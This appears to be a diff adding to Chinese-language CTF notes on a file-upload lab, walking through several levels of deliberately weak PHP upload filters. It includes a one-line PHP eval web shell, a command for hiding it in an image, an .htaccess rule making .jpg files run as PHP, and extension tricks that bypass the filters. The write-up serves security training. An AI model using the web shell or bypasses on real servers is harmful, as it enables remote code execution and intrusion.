@@ -1,6 +1,6 @@
 # Basic
 
-`更新时间：2023-11-26`
+`更新时间：2023-11-28`
 
 注释解释：
 
@@ -134,6 +134,36 @@ ssh -p <port> <username>@<hostname>
 打开网站，内含20道文件上传小题目
 
 > <img src="https://github.com/Ki1z/CTF/blob/main/IMG/LLU]]W%YBJ}`$LK7{S77HZ7.png?raw=true">
+
+### 图片马
+
+图片马是指在一张图片中包含一条或多条木马语句，这里我们仅使用一句话木马
+
+```php
+   <?php phpinfo(); @eval($_POST['admin']);?>
+```
+
+解释：
+
+- `phpinfo();` 用于测试是否正确解析php代码
+
+- `@` 错误抑制符，无论后方的命令是否执行成功，都不会报错
+
+- `eval();` eval函数，可以将括号内的内容作为php代码输出
+
+- `$_POST[]` 超级全局变量$_POST，用于传参
+
+- `'admin'` 参数名，通过POST此参数到服务器执行相关代码
+
+创建完成一句话木马后，使用cmd制作
+
+```shell
+copy ImgName[.jpg|.png|.gif...] /B + TrojanName.php TrojanImgName[.jpg|.png|.gif...]
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/`F2)XX9YO%H1RBNV$%81UVS.png?raw=true">
+
+*注：为了避免制作图片马的时候php代码被修改，可以在代码前多加几个空格*
 
 #### Pass-01
 
@@ -275,4 +305,176 @@ if (isset($_POST['submit'])) {
     }
 }
 ```
+
+但是没有过滤 `.htaccess` ，下面简要概述 `.htaccess`
+
+**.htaccess**
+
+`.htaccess` 被称为分布式配置文件，提供了通过目录修改配置的方法，在一个特定的文档目录中包含该文件，以此作用于其目录及其所有子目录。通俗地说，可以向服务器上传一个 `.htaccess` 文件，在此文件内包含多条命令，以此来修改该目录及其子目录下的配置
+
+先创建一个 `.htaccess` 文件，文件内包含以下命令，将jpg文件作为php文件解析
+
+```
+AddType application/x-httpd-php .jpg
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/_5]I)J@}Z@1{(S3(_DWP83M.png?raw=true">
+
+然后上传 `.htaccess`
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/$}OPWM9CDGR(UWLGLT3V678.png?raw=true">
+
+上传图片马，成功
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/5)XSNG_)VCT$}UFJ`6}@L3M.png?raw=true">
+
+#### Pass-05
+
+分析源码，对比Pass-04，增加了对 `.htaccess` 的过滤，但是去除了“转换为小写这一步”
+
+```php
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+```
+
+所以上传普通的图片格式木马（将.php改为.jpg），抓包，修改大写后缀
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/E@`JD[I2QVU3}~)%}))G)KC.png?raw=true">
+
+上传成功
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/``B]V08I$1L_U5D}6LHQAFH.png?raw=true">
+
+#### Pass-06
+
+对比Pass-05，去除了“首尾去空”
+
+```php
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
+        $file_name = $_FILES['upload_file']['name'];
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file,$img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件不允许上传';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+```
+
+则在抓包的时候将后缀改为 `.php(空格)`
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/]GDKNNSPD_GX9KC{373%6}L.png?raw=true">
+
+上传成功
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/N[EM7WJZ{X4B2DF9Y]Z9NU7.png?raw=true">
+
+#### Pass-07
+
+去除“删除文件名末尾的点”，则在抓包时将后缀改为 `.php.` ，该题省略
+
+```php
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+```
+
+#### Pass-08
+
+去除“去除字符串::\$DATA”，则在抓包时将后缀改为 `.php::$DATA` ，该题省略
+
+```php
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = trim($file_ext); //首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+```
+
+*注：因篇幅过长，此处不为 `::$DATA` 做解释，请<a href="https://learn.microsoft.com/zh-cn/windows/win32/fileio/file-streams">点击此处</a>前往Microsoft官方文档*
 
